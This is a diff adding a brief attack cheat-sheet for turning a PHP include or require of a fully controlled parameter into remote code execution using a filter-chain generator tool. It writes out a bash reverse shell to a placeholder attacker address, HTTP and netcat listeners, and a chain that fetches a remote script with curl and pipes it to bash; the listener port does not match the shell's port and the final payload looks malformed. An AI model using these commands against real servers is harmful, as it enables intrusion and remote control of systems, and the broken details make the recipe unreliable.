@@ -1,0 +1,23 @@
+A CLI to generate PHP filters chain, get your RCE without uploading a file if you control entirely the parameter passed to a require or an include in PHP!
+
+git clone https://github.com/synacktiv/php_filter_chain_generator.git
+
+python3 php_filter_chain_generator.py — chain ‘<?php phpinfo(); ?>
+
+--------------------------------------------------------------------------
+
+Create your Script and call it “revshell”:
+
+bash -i >& /dev/tcp/YOUR_IP/4433 0>&1
+
+Run python3 -m http.server 80
+
+Run nc -lvnp 1234
+
+Create the chain command with the python script:
+
+python3 php_filter_chain_generator.py — chain ‘curl -s -L YOUR_IP/revshell|bash ?>’
+
+
+
+--------------------------------------------------------------------------------------
